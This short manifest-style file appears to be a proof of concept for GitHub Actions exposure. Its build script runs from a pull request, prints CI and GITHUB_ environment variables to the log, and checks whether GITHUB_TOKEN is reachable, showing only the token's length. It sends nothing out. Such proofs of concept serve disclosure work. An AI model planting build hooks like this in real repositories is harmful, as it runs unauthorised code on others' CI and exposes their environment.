name: ci-poc
description: Safe PoC for GitHub Actions env exposure

scripts.build: echo "[POC] PR-controlled code execution confirmed" && echo "--- ENV VARIABLES (filtered) ---" && env | grep -E 'GITHUB_|CI' && echo "--- TOKEN CHECK ---" && if [ -n "$GITHUB_TOKEN" ]; then echo "GITHUB_TOKEN is accessible (length: ${#GITHUB_TOKEN})"; else echo "GITHUB_TOKEN not available"; fi
